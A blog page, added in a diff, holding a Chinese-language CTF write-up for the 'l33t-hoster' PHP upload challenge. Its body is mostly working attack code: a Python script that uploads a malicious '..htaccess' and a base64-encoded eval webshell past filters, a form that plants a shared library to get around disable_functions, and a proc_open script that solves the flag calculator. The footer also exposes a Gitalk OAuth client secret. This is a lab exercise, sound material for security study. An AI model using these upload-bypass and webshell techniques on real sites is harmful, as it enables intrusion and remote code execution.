@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>l33t-hoster(.htaccess+disable_function+计算器) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="l33t-hoster(.htaccess+disable_function+计算器) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="l33t-hoster(.htaccess+disable_function+计算器)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/fGjL-wZQn/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>l33t-hoster(.htaccess+disable_function+计算器)</h1>
+            <span class="meta">
+            	Posted on
+              2020-06-01，3 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>F12得到源码<br>
+黑名单过滤的死死的。估计就是.htaccess<br>
+这里做了些限制。一大堆。后缀名啥的。先不看。<br>
+看文件内容不能出现&lt;?。那么可以用.htaccess base64包含绕过<br>
+然后有个getimagesize得等于1337。可以用wbmp的文件头绕过<br>
+最后。来看文件名的控制。</p>
+<pre><code>$parts = explode(&quot;.&quot;, $name);
+#如果传.htaccess。这里就为&quot;&quot;,&quot;htaccess&quot;
+$ext = array_pop($parts);
+#删除最后一个键值。并且返回值。也就是htaccess
+if (empty($parts[0])) {
+    array_shift($parts);
+    #如果数组第一个值为空。就删掉。
+}
+$name = implode(&quot;.&quot;, $parts);
+#组合。
+move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);
+</code></pre>
+<p>也就是说。他以点号分隔。然后删掉第一个空字符。然后剩下的组合<br>
+那么我们构造..htaccess<br>
+经过第一个删除空值以后变成了&quot;&quot;,&quot;htaccess&quot;<br>
+然后组合。由于第一个还是空。那么无法组合。<code>$name</code>就为空<br>
+拼接到文件名之后就变成了.htaccess<br>
+然后上传</p>
+<pre><code>import requests
+header={&quot;PHPSESSID&quot;:&quot;e2s7q6jsgp90khph93usloffl2&quot;}
+data={&quot;upload&quot;:&quot;Submit&quot;}
+url='http://88364f44-5876-4381-be5d-fa8f57d3c61f.node3.buuoj.cn/'
+htaccess=b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39
+AddType application/x-httpd-php .cc
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.cc&quot;
+&quot;&quot;&quot;
+shell=b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39
+12PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
+&quot;&quot;&quot;
+files={
+    'image':('..htaccess',htaccess,'image/jpeg'),
+    'upload': (None, &quot;Submit Query&quot;, None)
+    }
+r = requests.post(url=url,files=files,cookies=header)
+print(r.text)
+files={
+    'image':('shell.cc',shell,'image/jpeg'),
+    &quot;upload&quot; : (None, &quot;Submit Query&quot;, None)
+    }
+r = requests.post(url=url,cookies=header,files=files)
+print(r.text)
+</code></pre>
+<p>直接连接。发现有disable_function。还禁用了file_put_contents<br>
+。那么通过一句话执行move_upload_file。上传文件</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://88364f44-5876-4381-be5d-fa8f57d3c61f.node3.buuoj.cn/images/5168c796704cdf88ba23e3779b81ad65b586471d/shell.cc&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+&lt;input type=&quot;text&quot; name=&quot;a&quot; value=&quot;move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/1.so');&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>传完利用脚本和SO。包含一下。发现/get_flag是个计算器<br>
+刚好最近学了手PHP交互</p>
+<pre><code>&lt;?php
+$d = array(array(&quot;pipe&quot;, &quot;r&quot;),array(&quot;pipe&quot;, &quot;w&quot;),array(&quot;pipe&quot;, &quot;w&quot;));
+$p = proc_open('/get_flag', $d, $pipes, '/');
+if (is_resource($p)) {
+        $t = fgets($pipes[1]);
+        $t = fgets($pipes[1]);
+        var_dump($t);
+        $expression = 'return '.str_replace('=','',$t).';';
+       fwrite($pipes[0], eval($expression).&quot;\n&quot;);    
+        echo stream_get_contents($pipes[1]);
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1591017805976.png" alt="" loading="lazy"></figure>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/KeT9UAVHR/">
+              <span class="post-title">
+                RCTF2020 Calc(数字webshell以及php交互)&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
